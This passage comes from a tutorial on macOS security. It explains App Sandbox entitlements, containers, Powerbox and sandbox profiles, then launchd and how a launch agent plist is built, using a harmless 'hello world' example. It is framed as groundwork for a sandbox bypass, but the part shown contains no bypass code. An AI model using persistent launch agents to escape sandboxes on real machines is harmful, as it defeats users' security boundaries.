&lt;p&gt;But, Why It’s important?. Because, any non-sandboxed app has the full rights of the user who is running that app, and can&lt;/p&gt;

&lt;p&gt;access any resources that the user can access. If that app or the frameworks it is linked against contain security holes, an&lt;/p&gt;

&lt;p&gt;attacker can potentially exploit those holes to take control of that app, and in doing so, the attacker gains the ability to&lt;/p&gt;

&lt;p&gt;do anything that the user can do on the system. So, Sandboxing the app helps to limit the infection of compromise and the&lt;/p&gt;

&lt;p&gt;attack surface for the malicious actor. So, To go more deeper how does the sandbox works and/or implemented ?. When the app&lt;/p&gt;

&lt;p&gt;is sandboxed it’s defined in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt; which we discussed in the first part. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlement&lt;/code&gt; of the sandbox is&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.apple.security.app-sandbox&lt;/code&gt;. The app sandbox has elements and these elements are container directories, entitlements,&lt;/p&gt;

&lt;p&gt;user-determined permissions, privilege separation, and kernel enforcement. Each App Sandboxed runs under a container created at&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/Library/Containers/&lt;/code&gt; under this path, you can find each sandboxed app with its &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CFBundleIdentifier&lt;/code&gt; as a folder and this&lt;/p&gt;

&lt;p&gt;folder contains a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plist&lt;/code&gt; file and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sandbox profile data&lt;/code&gt; file that contains the configuration of the sandboxed app like it’s&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt;. When you apply sandboxing to your app, On the first launch of your app &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; Creates a special directory&lt;/p&gt;

&lt;p&gt;under the user that using it specifically the home directory in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/Library/Containers/&lt;/code&gt; and the app has unfettered&lt;/p&gt;

&lt;p&gt;read/write access to the container for the user who ran it. Now, The question is how the app integrates with the system when needed.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/d0ef078a57857815e067fd12b352633c&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Well, Let’s take the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Open&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Save&lt;/code&gt; permissions as an example and suppose that the app wants to open and save something into&lt;/p&gt;

&lt;p&gt;any directory, What will happen is that the app will interact with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Powerbox&lt;/code&gt; API which is an internal part of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; and&lt;/p&gt;

&lt;p&gt;mainly associated with the sandboxing mechanism which is responsible for allowing sandboxed applications to request access to&lt;/p&gt;

&lt;p&gt;specific user files or resources without giving the application unrestricted access to the entire filesystem. And for more&lt;/p&gt;

&lt;p&gt;clearness it works as the following: Let’s say a sandboxed app wants to open a user file. The app cannot directly access the&lt;/p&gt;

&lt;p&gt;filesystem due to its sandbox restrictions, The app will present a file dialog to the user (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NSOpenPanel&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NSSavePanel&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt;). When the user uses this dialog to select a file, they’re indirectly interacting with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Powerbox&lt;/code&gt; and Once the user&lt;/p&gt;

&lt;p&gt;selects a file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Powerbox&lt;/code&gt; grants the app a token (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;or an exception to its sandbox&lt;/code&gt;) to access only that specific file. After&lt;/p&gt;

&lt;p&gt;that the app doesn’t get unrestricted access to the whole filesystem but just the user-selected file. Finally, With the&lt;/p&gt;

&lt;p&gt;user’s explicit permission through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Powerbox&lt;/code&gt; system, sandboxed apps can also retain access to specific resources across&lt;/p&gt;

&lt;p&gt;launches using “&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security-scoped bookmarks&lt;/code&gt;.” for example, a sandboxed text editor to save changes back to a file that a user&lt;/p&gt;

&lt;p&gt;has previously opened. So, In general the sandboxing feature in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; limit the following types of operations: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;File read,&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write, with many different granular operations&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPC&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Posix&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SysV&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mach&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Network&lt;/code&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inbound&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;outbound&lt;/code&gt;, Process&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execution&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fork&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Signals&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sysctl&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System&lt;/code&gt;. When an application is sandboxed and gets started it first calls&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sandbox_init&lt;/code&gt; which will place the process into a sandbox using one of the pre-defined profiles. What are the profiles?&lt;/p&gt;

&lt;p&gt;The sandbox profiles are the set of rules which how the app behaves. example on the sandbox profiles:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/38de653a3d3b19f5ccd8910e99d2bb04&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kSBXProfileNoInternet&lt;/code&gt;: TCP/IP networking is prohibited.&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kSBXProfileNoNetwork&lt;/code&gt;: All sockets-based networking is prohibited.&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kSBXProfileNoWrite&lt;/code&gt;: File system writes are prohibited.&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kSBXProfileNoWriteExceptTemporary&lt;/code&gt;: File system writes are restricted to the temporary folder /var/tmp and the folder&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;

    &lt;p&gt;specified by theconfstr(3) configuration variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_CS_DARWIN_USER_TEMP_DIR&lt;/code&gt;.&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kSBXProfilePureComputation&lt;/code&gt;: All operating system services are prohibited.&lt;/p&gt;

    &lt;p&gt;Now, We have the basic knowledge about the app sandboxing, how it works and some of its components. Let’s move further.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt; &lt;/p&gt;

&lt;h1 id=&quot;launch-agent-and-bypass-the-sandbox&quot;&gt;&lt;strong&gt;Launch Agent and Bypass the sandbox&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Now we come to bypass the sandbox but before we do tho we need to understand what is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launchd&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launch agent&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launched&lt;/code&gt; is a unified service-management framework initialy relased in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2005&lt;/code&gt; which is responsible for starting, stopping, and&lt;/p&gt;

&lt;p&gt;managing daemons (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;daemons&lt;/code&gt; are the background process), applications, processes, and scripts, both at system startup and&lt;/p&gt;

&lt;p&gt;during the regular operation of the system. But, What does &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unified&lt;/code&gt; framework means ?, It means that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launched&lt;/code&gt; replaces&lt;/p&gt;

&lt;p&gt;several other &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Unix&lt;/code&gt; based service-management utilities and scripts that were traditionally used in older versions of macOS&lt;/p&gt;

&lt;p&gt;such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rc&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;StartupItems&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inetd&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xinetd&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cron&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;at&lt;/code&gt;. There is more than one type for the background processes&lt;/p&gt;

&lt;p&gt;(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;daemons&lt;/code&gt;), So the user can choose the one that fits its own requirements, considering the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Whether it does something for the currently logged in user or for all users.&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Whether it will be used by a single application or by multiple applications.&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Whether it ever needs to display a user interface or launch a GUI application.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;the background processes (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;daemons&lt;/code&gt;) has many types as the following:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/37cc1d9da261814cc7aa6c1ffee7e2ce&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Each type is used for a spasific job and run in different context. But, the one we are intreasted in is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launch Agent&lt;/code&gt;, We&lt;/p&gt;

&lt;p&gt;discussed the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launch Agent&lt;/code&gt; before in the first part and we gonna talk about it again:&lt;/p&gt;

&lt;p&gt;A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launch Agent&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; is a tool designed for managing, scheduling, and executing background tasks. Part of the broader&lt;/p&gt;

&lt;p&gt;Launchd system, this mechanism takes charge of initiating, halting, and overseeing processes during different phases of the&lt;/p&gt;

&lt;p&gt;system’s operation and startup. Configuration files situated in specific folders guide the operation of daemons and agents&lt;/p&gt;

&lt;p&gt;managed by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launchd&lt;/code&gt;. While these agents are supervised by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launchd&lt;/code&gt;, their operations cater to the requirements of the&lt;/p&gt;

&lt;p&gt;currently active user, implying they function within the user context. Such agents possess the capability to engage in&lt;/p&gt;

&lt;p&gt;communication with other processes present in the identical user session, as well as with universal daemons in the&lt;/p&gt;

&lt;p&gt;overarching system context. Even though they have the capacity to exhibit a visual interface, it’s typically discouraged. For&lt;/p&gt;

&lt;p&gt;developers offering both services exclusive to users and those that aren’t, the dual incorporation of a daemon and an agent&lt;/p&gt;

&lt;p&gt;is a viable strategy. In such setups, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;daemon&lt;/code&gt;, operating within the system context, extends the non-user-specific&lt;/p&gt;

&lt;p&gt;services. Concurrently, for each active user session, an instance of the agent is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launched&lt;/code&gt;. These agents then collaborate&lt;/p&gt;

&lt;p&gt;with the daemon, ensuring seamless service provision to every user. The following are the directories of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launch Agents&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9b278f75989b242621866cd8707dc951&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;When talking about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launchd&lt;/code&gt;, there are two primary session contexts to be aware of:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/58f90f264a6846b3a0a35a2a25953b2f&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Startup Session&lt;/code&gt;:&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;This is the session context that starts when the system boots up, even before any user logs in. Daemons that run within&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;

        &lt;p&gt;the startup session context has system-wide permissions. They operate in the background, not associated with any&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;

        &lt;p&gt;specific user, and generally provide services that need to be available from the moment the system starts. These&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;

        &lt;p&gt;daemons run without any user interface, and they don’t have access to user-specific services or data unless they&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;

        &lt;p&gt;explicitly request and are granted such access. The configuration files for these daemons are usually found in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Library/LaunchDaemons/&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/System/Library/LaunchDaemons/&lt;/code&gt;.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Login Session&lt;/code&gt;:&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;This session starts when a user logs into the system. Each user who logs in gets their own login session. Agents run&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;

        &lt;p&gt;within this context operate on behalf of the logged-in user and can access user-specific services, data, and even GUI&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;

        &lt;p&gt;elements if necessary. However, as they run with the permissions of the logged-in user, which means they can’t&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;

        &lt;p&gt;typically perform system-wide operations unless the user has elevated privileges. The configuration files for these&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;

        &lt;p&gt;agents can be found in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/Library/LaunchAgents/&lt;/code&gt; for user-specific agents and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Library/LaunchAgents/&lt;/code&gt; for agents that&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;

        &lt;p&gt;should be available to any user who logs in, but still run in the context of the logged-in user.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Now, Let’s see how is the startup for each session is done:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;After the system is booted and the kernel is running, launchd is run to finish the system initialization. As part of that&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;

    &lt;p&gt;initialization, it goes through the following steps:&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;It loads the parameters for each launch-on-demand system-level daemon from the property list files found in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/System/Library/LaunchDaemons/&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Library/LaunchDaemons/&lt;/code&gt;.&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;It registers the sockets and file descriptors requested by those daemons.&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;It launches any daemons that requested to be running all the time.&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;As requests for a particular service arrive, it launches the corresponding daemon and passes the request to it.&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;When the system shuts down, it sends a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SIGTERM&lt;/code&gt; signal to all of the daemons that it started.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;

    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The process for per-user agents is similar. When a user logs in, a per-user launchd is started. It does the following:&lt;/p&gt;

    &lt;p&gt; &lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;It loads the parameters for each launch-on-demand user agent from the property list files found in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/System/Library/LaunchAgents&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Library/LaunchAgents&lt;/code&gt;, and the user’s individual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/Library/LaunchAgents&lt;/code&gt; directory.&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;It registers the sockets and file descriptors requested by those user agents.&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;It launches any user agents that requested to be running all the time.&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;As requests for a particular service arrive, it launches the corresponding user agent and passes the request to it.&lt;/p&gt;

        &lt;p&gt; &lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;When the user logs out, it sends a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SIGTERM&lt;/code&gt; signal to all of the user agents that it started.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt; &lt;/p&gt;

&lt;h2 id=&quot;creating-a-launch-agent&quot;&gt;&lt;strong&gt;Creating a Launch Agent&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;When creating a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Launch Agent&lt;/code&gt; we configure it in Property List(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plist&lt;/code&gt;) file in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XML&lt;/code&gt; format. The property list file is&lt;/p&gt;

&lt;p&gt;structured the same for both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;daemons&lt;/code&gt; and agents. You indicate whether it describes a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;daemon&lt;/code&gt; or agent by the directory you&lt;/p&gt;

&lt;p&gt;place it in. Property list files describing daemons are installed in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Library/LaunchDaemons&lt;/code&gt;, and those describing agents are&lt;/p&gt;

&lt;p&gt;installed in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Library/LaunchAgents&lt;/code&gt; or in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LaunchAgents&lt;/code&gt; subdirectory of an individual user’s Library directory. The&lt;/p&gt;

&lt;p&gt;needed keys in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plist&lt;/code&gt; file as the following:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/988ba61969c123f9388fa677561cb239&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;We can see in the above picture each &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key&lt;/code&gt; and its description. Now, an example of the agent:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&amp;lt;plist version=&quot;1.0&quot;&amp;gt;
&amp;lt;dict&amp;gt;
    &amp;lt;key&amp;gt;Label&amp;lt;/key&amp;gt;
    &amp;lt;string&amp;gt;com.example.hello&amp;lt;/string&amp;gt;
    &amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt;
    &amp;lt;array&amp;gt;
        &amp;lt;string&amp;gt;hello&amp;lt;/string&amp;gt;
        &amp;lt;string&amp;gt;world&amp;lt;/string&amp;gt;
    &amp;lt;/array&amp;gt;
    &amp;lt;key&amp;gt;KeepAlive&amp;lt;/key&amp;gt;
    &amp;lt;true/&amp;gt;
&amp;lt;/dict&amp;gt;
&amp;lt;/plist&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Let’s explain this example &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plist&lt;/code&gt; file:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;This portion indicates that the file is an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XML&lt;/code&gt; document and specifies the version of XML being used. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DOCTYPE&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;declaration defines the document type and references a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DTD&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Document Type Definition&lt;/code&gt;) from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apple&lt;/code&gt; which sets rules for the&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plist&lt;/code&gt; file structure.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;plist version=&quot;1.0&quot;&amp;gt;
&amp;lt;dict&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;These tags indicate the start of the plist content and a dictionary data structure. The dictionary will contain key-value&lt;/p&gt;

&lt;p&gt;pairs that define the properties and settings of the launch agent.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;key&amp;gt;Label&amp;lt;/key&amp;gt;
&amp;lt;string&amp;gt;com.example.hello&amp;lt;/string&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;This key-value pair assigns a unique identifier to the launch agent. This label, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.example.hello&lt;/code&gt;, is used by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launchctl&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;(the command-line interface to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launchd&lt;/code&gt;) to reference the agent for tasks like loading or unloading it.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt;
&amp;lt;array&amp;gt;
    &amp;lt;string&amp;gt;hello&amp;lt;/string&amp;gt;
    &amp;lt;string&amp;gt;world&amp;lt;/string&amp;gt;
&amp;lt;/array&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;This key specifies the program to be executed along with its arguments. In this case, the program named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hello&lt;/code&gt; will be run&lt;/p&gt;

&lt;p&gt;with the argument &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;world&lt;/code&gt;. The path to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hello&lt;/code&gt; program is not specified here, so it would need to be in a location&lt;/p&gt;

&lt;p&gt;recognized by the system’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH&lt;/code&gt; or the full path should be provided.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;key&amp;gt;KeepAlive&amp;lt;/key&amp;gt;
&amp;lt;true/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;This key-value pair indicates that the program should be kept running indefinitely. If the program exits for any reason,&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launchd&lt;/code&gt; will restart it. The value &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;true/&amp;gt;&lt;/code&gt; means that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KeepAlive&lt;/code&gt; feature is enabled.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;/dict&amp;gt;
&amp;lt;/plist&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

